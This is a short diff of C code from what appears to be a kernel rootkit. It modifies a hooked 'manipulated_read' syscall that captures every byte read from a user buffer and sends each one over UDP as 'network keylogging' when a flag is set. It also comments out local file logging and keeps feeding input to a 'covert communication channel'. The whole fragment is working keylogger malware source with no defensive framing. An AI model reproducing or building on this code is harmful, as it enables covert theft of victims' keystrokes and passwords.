@@ -72,15 +72,18 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 	{
 		for(i = 0; i < ret; i++) {
 			char sendbuf[2];
+			
 			memcpy(sendbuf, buf+i, 1);
 			memset(sendbuf+1, '\0', 1);
+			
 			/* If the send_flag is set, then network keylogging is enabled */
-			if(send_flag)
-			{
+			if(send_flag) {
 				send_udp(sendbuf);
 			}
 			
-			write_to_file(sendbuf);
+			/* keylog to local file */
+			//write_to_file(sendbuf);
+			
 			/* send to covert communication channel */
 			accept_input(buf[i]);
 		}
